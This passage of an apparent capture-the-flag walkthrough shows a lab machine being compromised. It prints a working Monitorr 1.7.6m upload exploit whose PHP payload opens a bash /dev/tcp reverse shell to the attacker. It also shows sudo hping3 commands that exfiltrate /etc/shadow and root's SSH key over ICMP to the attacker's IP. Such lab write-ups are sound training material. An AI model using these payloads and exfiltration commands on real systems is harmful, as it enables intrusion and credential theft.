</span></span><span style=display:flex><span>Initiating NSE at 20:43
</span></span><span style=display:flex><span>Completed NSE at 20:43, 0.23s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 20:43
</span></span><span style=display:flex><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.200.218 <span style=color:#f92672>(</span>192.168.200.218<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.059s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> de:b5:23:89:bb:9f:d4:1a:b5:04:53:d0:b7:5c:b0:3f <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 16:09:14:ea:b9:fa:17:e9:45:39:5e:3b:b4:fd:11:0a <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 9f:66:5e:71:b9:12:5d:ed:70:5a:4f:5a:8d:0d:65:d5 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.38 <span style=color:#f92672>((</span>Debian<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>| http-title:             Monitorr            | Monitorr        
</span></span><span style=display:flex><span>|_Requested resource was http://192.168.200.218/mon/
</span></span><span style=display:flex><span>| http-methods: 
</span></span><span style=display:flex><span>|_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.38 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed port
</span></span><span style=display:flex><span>Aggressive OS guesses: Linux 2.6.18 <span style=color:#f92672>(</span>91%<span style=color:#f92672>)</span>, Linux 4.15 - 5.6 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 5.0 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 2.6.32 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 3.4 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 3.5 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 3.7 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 4.2 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Linux 4.4 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>, Synology DiskStation Manager 5.1 <span style=color:#f92672>(</span>90%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>test conditions non-ideal<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Uptime guess: 47.380 days <span style=color:#f92672>(</span>since Thu Jul <span style=color:#ae81ff>21</span> 11:36:21 2022<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>2</span> hops
</span></span><span style=display:flex><span>TCP Sequence Prediction: Difficulty<span style=color:#f92672>=</span><span style=color:#ae81ff>262</span> <span style=color:#f92672>(</span>Good luck!<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>IP ID Sequence Generation: All zeros
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TRACEROUTE <span style=color:#f92672>(</span>using port 443/tcp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>HOP RTT      ADDRESS
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   58.96 ms 192.168.49.1 <span style=color:#f92672>(</span>192.168.49.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   58.32 ms 192.168.200.218 <span style=color:#f92672>(</span>192.168.200.218<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NSE: Script Post-scanning.
</span></span><span style=display:flex><span>Initiating NSE at 20:43
</span></span><span style=display:flex><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 20:43
</span></span><span style=display:flex><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 20:43
</span></span><span style=display:flex><span>Completed NSE at 20:43, 0.00s elapsed
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 12.91 seconds
</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>78</span> <span style=color:#f92672>(</span>5.316KB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>36</span> <span style=color:#f92672>(</span>2.872KB<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Navigate to port <code>80</code> and at the bottom of the web page notice the version <code>Monitorr 1.7.6m</code>.<br>Then put the version found on <code>searchsploit</code>.
Command: <code>searchsploit monitorr 1.7.6m</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ searchsploit monitorr 1.7.6m 
</span></span><span style=display:flex><span>----------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span> Exploit Title                                                               |  Path
</span></span><span style=display:flex><span>----------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>Monitorr 1.7.6m - Authorization Bypass                                       | php/webapps/48981.py
</span></span><span style=display:flex><span>Monitorr 1.7.6m - Remote Code Execution <span style=color:#f92672>(</span>Unauthenticated<span style=color:#f92672>)</span>                    | php/webapps/48980.py
</span></span><span style=display:flex><span>----------------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span></code></pre></div><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Then, we can mirror the exploit: <code>php/webapps/48980.py</code>.<br>Command: <code>searchsploit -m php/webapps/48980.py</code></p><p>Don&rsquo;t modify the script and it should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python</span>
</span></span><span style=display:flex><span><span style=color:#75715e># -*- coding: UTF-8 -*-</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Exploit Title: Monitorr 1.7.6m - Remote Code Execution (Unauthenticated)</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Date: September 12, 2020</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Exploit Author: Lyhin&#39;s Lab</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Detailed Bug Description: https://lyhinslab.org/index.php/2020/09/12/how-the-white-box-hacking-works-authorization-bypass-and-remote-code-execution-in-monitorr-1-7-6/</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Software Link: https://github.com/Monitorr/Monitorr</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Version: 1.7.6m</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Tested on: Ubuntu 19</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> len (sys<span style=color:#f92672>.</span>argv) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>4</span>:
</span></span><span style=display:flex><span>        print (<span style=color:#e6db74>&#34;specify params in format: python &#34;</span> <span style=color:#f92672>+</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; target_url lhost lport&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/assets/php/upload.php&#34;</span>
</span></span><span style=display:flex><span>    headers <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;User-Agent&#34;</span>: <span style=color:#e6db74>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span>, <span style=color:#e6db74>&#34;Accept&#34;</span>: <span style=color:#e6db74>&#34;text/plain, */*; q=0.01&#34;</span>, <span style=color:#e6db74>&#34;Accept-Language&#34;</span>: <span style=color:#e6db74>&#34;en-US,en;q=0.5&#34;</span>, <span style=color:#e6db74>&#34;Accept-Encoding&#34;</span>: <span style=color:#e6db74>&#34;gzip, deflate&#34;</span>, <span style=color:#e6db74>&#34;X-Requested-With&#34;</span>: <span style=color:#e6db74>&#34;XMLHttpRequest&#34;</span>, <span style=color:#e6db74>&#34;Content-Type&#34;</span>: <span style=color:#e6db74>&#34;multipart/form-data; boundary=---------------------------31046105003900160576454225745&#34;</span>, <span style=color:#e6db74>&#34;Origin&#34;</span>: sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>], <span style=color:#e6db74>&#34;Connection&#34;</span>: <span style=color:#e6db74>&#34;close&#34;</span>, <span style=color:#e6db74>&#34;Referer&#34;</span>: sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;-----------------------------31046105003900160576454225745</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>Content-Disposition: form-data; name=</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>fileToUpload</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>; filename=</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>she_ll.php</span><span style=color:#ae81ff>\&#34;\r\n</span><span style=color:#e6db74>Content-Type: image/gif</span><span style=color:#ae81ff>\r\n\r\n</span><span style=color:#e6db74>GIF89a213213123&lt;?php shell_exec(</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#34;</span><span style=color:#f92672>+</span>sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>+</span><span style=color:#e6db74>&#34;/&#34;</span> <span style=color:#f92672>+</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34; 0&gt;&amp;1&#39;</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>);</span><span style=color:#ae81ff>\r\n\r\n</span><span style=color:#e6db74>-----------------------------31046105003900160576454225745--</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    requests<span style=color:#f92672>.</span>post(url, headers<span style=color:#f92672>=</span>headers, data<span style=color:#f92672>=</span>data)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    print (<span style=color:#e6db74>&#34;A shell script should be uploaded. Now we try to execute it&#34;</span>)
</span></span><span style=display:flex><span>    url <span style=color:#f92672>=</span> sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/assets/data/usrimg/she_ll.php&#34;</span>
</span></span><span style=display:flex><span>    headers <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#34;User-Agent&#34;</span>: <span style=color:#e6db74>&#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0&#34;</span>, <span style=color:#e6db74>&#34;Accept&#34;</span>: <span style=color:#e6db74>&#34;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#34;</span>, <span style=color:#e6db74>&#34;Accept-Language&#34;</span>: <span style=color:#e6db74>&#34;en-US,en;q=0.5&#34;</span>, <span style=color:#e6db74>&#34;Accept-Encoding&#34;</span>: <span style=color:#e6db74>&#34;gzip, deflate&#34;</span>, <span style=color:#e6db74>&#34;Connection&#34;</span>: <span style=color:#e6db74>&#34;close&#34;</span>, <span style=color:#e6db74>&#34;Upgrade-Insecure-Requests&#34;</span>: <span style=color:#e6db74>&#34;1&#34;</span>}
</span></span><span style=display:flex><span>    requests<span style=color:#f92672>.</span>get(url, headers<span style=color:#f92672>=</span>headers)
</span></span></code></pre></div><p>Then run the python script.<br>Command: <code>python 48980.py http://192.168.217.218/mon/ 192.168.49.217 443</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ python 48980.py http://192.168.217.218/mon/ 192.168.49.217 <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>A shell script should be uploaded. Now we try to execute it
</span></span></code></pre></div><p>Before running it, open a netcat listener on <code>443</code> port.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>192.168.49.200<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>192.168.200.218<span style=color:#f92672>]</span> <span style=color:#ae81ff>42540</span>
</span></span><span style=display:flex><span>bash: cannot set terminal process group <span style=color:#f92672>(</span>570<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
</span></span><span style=display:flex><span>bash: no job control in this shell
</span></span><span style=display:flex><span>www-data@icmp:/var/www/html/mon/assets/data/usrimg$ python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span>&lt;img$ python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span>www-data@icmp:/var/www/html/mon/assets/data/usrimg$ ^Z
</span></span><span style=display:flex><span>zsh: suspended  nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>geobour98@kali:~$ stty raw -echo;fg
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span>  + continued  nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>www-data@icmp:/var/www/html/mon/assets/data/usrimg$ export TERM<span style=color:#f92672>=</span>xterm-256color
</span></span><span style=display:flex><span>www-data@icmp:/var/www/html/mon/assets/data/usrimg$ stty rows <span style=color:#ae81ff>38</span> cols <span style=color:#ae81ff>111</span>
</span></span><span style=display:flex><span>www-data@icmp:/var/www/html/mon/assets/data/usrimg$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Now, we have a reverse shell as the <code>www-data</code> user.<br>There is an interesting file <code>reminder</code> in <code>/home/fox/</code> with contents:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>crypt with crypt.php: <span style=color:#66d9ef>done</span>, it works
</span></span><span style=display:flex><span>work on decrypt with crypt.php: howto?!?
</span></span></code></pre></div><p>We try to find <code>crypt.php</code> in the filesystem, but no luck there. Then, we see an interesting folder <code>devel</code> in <code>/home/fox/</code>, where we have <code>execute</code> permissions but not <code>read</code>. Navigate there and try to open the file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>www-data@icmp:/home/fox$ find / -type f -name crypt.php 2&gt;/dev/null
</span></span><span style=display:flex><span>www-data@icmp:/home/fox$ cd devel
</span></span><span style=display:flex><span>www-data@icmp:/home/fox/devel$ cat crypt.php
</span></span><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>echo crypt<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;[REDACTED]&#39;</span>,<span style=color:#e6db74>&#39;da&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>?&gt;
</span></span><span style=display:flex><span>www-data@icmp:/home/fox/devel$
</span></span></code></pre></div><p>The crypt function takes a string, which is the cleartext password (<code>[REDACTED]</code>) for the user <code>fox</code>, and a salt and then returns a hashed string.<br>Now we can switch to user <code>fox</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>www-data@icmp:/home/fox/devel$ su fox
</span></span><span style=display:flex><span>Password: 
</span></span><span style=display:flex><span>$ bash
</span></span><span style=display:flex><span>fox@icmp:~/devel$ id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>fox<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>fox<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>fox<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>fox@icmp:~/devel$ cd ..
</span></span><span style=display:flex><span>fox@icmp:~$ cat local.txt 
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p>After executing the command: <code>sudo -l</code> we see that we can execute <code>hping3</code> as <code>root</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>fox@icmp:~$ sudo -l
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> fox: 
</span></span><span style=display:flex><span>Matching Defaults entries <span style=color:#66d9ef>for</span> fox on icmp:
</span></span><span style=display:flex><span>    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>User fox may run the following commands on icmp:
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> /usr/sbin/hping3 --icmp *
</span></span><span style=display:flex><span>    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> /usr/bin/killall hping3
</span></span></code></pre></div><p>Unfortunately, we can&rsquo;t execute the <code>sudo</code> command for <code>hping3</code> from <a href=https://gtfobins.github.io/gtfobins/hping3/#sudo>https://gtfobins.github.io/gtfobins/hping3/#sudo</a>, because of the necessary <code>--icmp</code>.<br>Then, from the help menu of <code>hping3</code> we identify 2 interesting parameters: <code>-d</code> (data from file) and <code>-E</code> (data from file).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>fox@icmp:~$ sudo /usr/sbin/hping3 --icmp -h                                                                    
</span></span><span style=display:flex><span>usage: hping3 host <span style=color:#f92672>[</span>options<span style=color:#f92672>]</span>                                                                                   
</span></span><span style=display:flex><span>  -h  --help      show this help                                                                               
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Common
</span></span><span style=display:flex><span>  -d  --data       data size                    <span style=color:#f92672>(</span>default is 0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  -E  --file       data from file
</span></span><span style=display:flex><span>  -e  --sign       add <span style=color:#e6db74>&#39;signature&#39;</span>
</span></span><span style=display:flex><span>  -j  --dump       dump packets in hex
</span></span><span style=display:flex><span>  -J  --print      dump printable characters
</span></span><span style=display:flex><span>  -B  --safe       enable <span style=color:#e6db74>&#39;safe&#39;</span> protocol
</span></span><span style=display:flex><span>  -u  --end        tell you when --file reached EOF and prevent rewind
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</span></span></code></pre></div><p>With the parameters <code>-d</code> and <code>-E</code> we can exfiltrate data from files through icmp protocol.
Command: <code>sudo /usr/sbin/hping3 --icmp -d 1416 -E /etc/shadow 192.168.49.200</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>fox@icmp:~$ sudo /usr/sbin/hping3 --icmp -d <span style=color:#ae81ff>1416</span> -E /etc/shadow 192.168.49.200
</span></span><span style=display:flex><span>HPING 192.168.49.200 <span style=color:#f92672>(</span>ens160 192.168.49.200<span style=color:#f92672>)</span>: icmp mode set, <span style=color:#ae81ff>28</span> headers + <span style=color:#ae81ff>1416</span> data bytes
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>main<span style=color:#f92672>]</span> memlockall<span style=color:#f92672>()</span>: Operation not supported
</span></span><span style=display:flex><span>Warning: can<span style=color:#960050;background-color:#1e0010>&#39;</span>t disable memory paging!
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>2130</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span> rtt<span style=color:#f92672>=</span>62.3 ms
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>2238</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span> rtt<span style=color:#f92672>=</span>62.2 ms
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>2292</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span> rtt<span style=color:#f92672>=</span>62.1 ms
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>2508</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> rtt<span style=color:#f92672>=</span>61.9 ms
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>2619</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>4</span> rtt<span style=color:#f92672>=</span>61.8 ms
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>2647</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> rtt<span style=color:#f92672>=</span>61.7 ms
</span></span><span style=display:flex><span>len<span style=color:#f92672>=</span><span style=color:#ae81ff>1444</span> ip<span style=color:#f92672>=</span>192.168.49.200 ttl<span style=color:#f92672>=</span><span style=color:#ae81ff>63</span> id<span style=color:#f92672>=</span><span style=color:#ae81ff>2794</span> icmp_seq<span style=color:#f92672>=</span><span style=color:#ae81ff>6</span> rtt<span style=color:#f92672>=</span>69.6 ms
</span></span><span style=display:flex><span>^C
</span></span><span style=display:flex><span>--- 192.168.49.200 hping statistic ---
</span></span><span style=display:flex><span><span style=color:#ae81ff>7</span> packets transmitted, <span style=color:#ae81ff>7</span> packets received, 0% packet loss
</span></span><span style=display:flex><span>round-trip min/avg/max <span style=color:#f92672>=</span> 61.7/63.1/69.6 ms
</span></span></code></pre></div><p>Before running the <code>hping3</code> command, we should run <code>tcpdump</code> to receive the contents of <code>/etc/shadow</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo tcpdump icmp -i tun0 -w icmp.pcap
</span></span></code></pre></div><p>The output is saved on <code>icmp.pcap</code>, which can be opened with <code>wireshark</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ wireshark icmp.pcap
</span></span><span style=display:flex><span>root:<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>:19195:0:99999:7:::
</span></span><span style=display:flex><span>daemon:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>bin:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>sys:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>sync:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>games:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>man:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>lp:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>mail:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>news:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>uucp:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>proxy:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>www-data:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>backup:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>list:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>irc:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>gnats:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>nobody:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>_apt:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>systemd-timesync:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>systemd-network:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>systemd-resolve:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>messagebus:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>sshd:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>avahi:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>saned:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>colord:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>hplip:*:18545:0:99999:7:::
</span></span><span style=display:flex><span>systemd-coredump:!!:18545::::::
</span></span><span style=display:flex><span>fox:<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>:18599:0:99999:7:::
</span></span></code></pre></div><p>Also before trying to crack the root hash, we can try to exfiltrate the <code>private SSH key</code> of <code>root</code>, if there is one.<br>Command: <code>sudo /usr/sbin/hping3 --icmp -d 1416 -E /root/.ssh/id_rsa 192.168.49.200</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>fox@icmp:~$ sudo /usr/sbin/hping3 --icmp -d <span style=color:#ae81ff>1416</span> -E /root/.ssh/id_rsa 192.168.49.200
